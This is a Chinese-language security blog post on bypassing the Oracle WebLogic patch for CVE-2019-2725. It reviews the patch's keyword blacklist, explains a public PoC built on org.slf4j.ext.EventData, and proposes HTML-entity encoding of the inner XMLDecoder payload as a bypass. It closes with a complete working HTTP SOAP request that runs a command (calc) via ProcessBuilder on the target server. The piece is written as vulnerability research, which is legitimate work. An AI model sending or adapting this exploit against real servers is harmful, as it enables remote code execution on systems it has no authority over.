www.anquanke.com/CVE-2019-2725高版本POC拓展.md

> 原文链接: https://www.anquanke.com//post/id/226358 


# CVE-2019-2725高版本POC拓展


                                阅读量   
                                **141627**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t015401aaf7b7b3b11b.png)](https://p2.ssl.qhimg.com/t015401aaf7b7b3b11b.png)



## 0x00 前言

在对大佬们高版本的POC进行分析后，我把重点放在了如何绕过黑名单限制上，那么利用XML可以解析的其它编码格式尝试一下绕过。



## 0x01 补丁回顾

首先回顾一下这个经典的补丁截图，摘自：

[http://www.sd.edu.cn/info/1011/1131.htm](http://www.sd.edu.cn/info/1011/1131.htm)

[![](https://p5.ssl.qhimg.com/t01774303afd2e788bf.jpg)](https://p5.ssl.qhimg.com/t01774303afd2e788bf.jpg)

[![](https://p4.ssl.qhimg.com/t016c099ce75cfa88ef.jpg)](https://p4.ssl.qhimg.com/t016c099ce75cfa88ef.jpg)

可以看到对object、new、method关键字做了限制，而且对于array数组的长度也做了限制，不得大于10000。



## 0x02 高版本POC分析

现在网上也公开了12.1.3版本的POC，利用org.slf4j.ext.EventData类进行反序列化操作，这个类的构造方法如下：

[![](https://p3.ssl.qhimg.com/t01ac6faa39ea9df1ab.jpg)](https://p3.ssl.qhimg.com/t01ac6faa39ea9df1ab.jpg)

可以看到这个类需要接收一个XML的字符串，那么POC构造如下：

[![](https://p5.ssl.qhimg.com/t010fc387aca5660b90.jpg)](https://p5.ssl.qhimg.com/t010fc387aca5660b90.jpg)

那前面也看到了补丁限制了一些关键字，而需要解析的XML恰好含有这些关键字，绕过的思路就是整个的XML字段真的当作一个字符串传入，CDATA包含的字符串正好可以作为XML文本去解析。



## 0x03 绕过思路扩展

说到这里大家可能就明白了，只要是XML能够解析的编码格式都可以一试，此时想起了前不久看到的《WAF Bypass之xerces解析》，这篇文章对XML的解析格式进行了分析，其中一种简便快捷的方式就是HTML实体编码，欸，讨巧了，直接尝试将org.slf4j.ext.EventData类的构造参数用实体编码传入试一下：

[![](https://p3.ssl.qhimg.com/t01b732a365e8650f81.jpg)](https://p3.ssl.qhimg.com/t01b732a365e8650f81.jpg)

很快啊，计算器啪地一下就弹出来了

[![](https://p1.ssl.qhimg.com/t0109201206cc63ce48.png)](https://p1.ssl.qhimg.com/t0109201206cc63ce48.png)

POC如下：

```
POST /_async/AsyncResponseService HTTP/1.1
Host: 192.168.188.130:7001
Accept-Encoding: gzip, deflate
SOAPAction:
Accept: /
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: keep-alive
content-type: text/xml
Content-Length: 1946

&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"&gt; &lt;soapenv:Header&gt; &lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt; &lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;

&lt;java&gt;&lt;class&gt;&lt;string&gt;org.slf4j.ext.EventData&lt;/string&gt;&lt;void&gt;&lt;string&gt;&lt;java version="1.8.0_131" class="java.beans.XMLDecoder"&gt;&lt;object class="java.lang.ProcessBuilder"&gt;&lt;array class="java.lang.String" length="1"&gt;&lt;void index="0"&gt;&lt;string&gt;calc&lt;/string&gt;&lt;/void&gt;&lt;/array&gt;&lt;void method="start" /&gt;&lt;/object&gt;&lt;/java&gt;&lt;/string&gt;
&lt;/void&gt;&lt;/class&gt;
&lt;/java&gt;
&lt;/work:WorkContext&gt;
&lt;/soapenv:Header&gt; &lt;soapenv:Body&gt;&lt;asy:onAsyncDelivery/&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;
```



## 0x04 总结

应该还有其它的编码绕过，希望有时间去搞吧。



## 参考链接

[https://blog.csdn.net/weixin_30408739/article/details/99877655](https://blog.csdn.net/weixin_30408739/article/details/99877655)<br>[https://xz.aliyun.com/t/7116](https://xz.aliyun.com/t/7116)<br>[https://www.anquanke.com/post/id/209826](https://www.anquanke.com/post/id/209826)<br>[http://www.sd.edu.cn/info/1011/1131.htm](http://www.sd.edu.cn/info/1011/1131.htm)
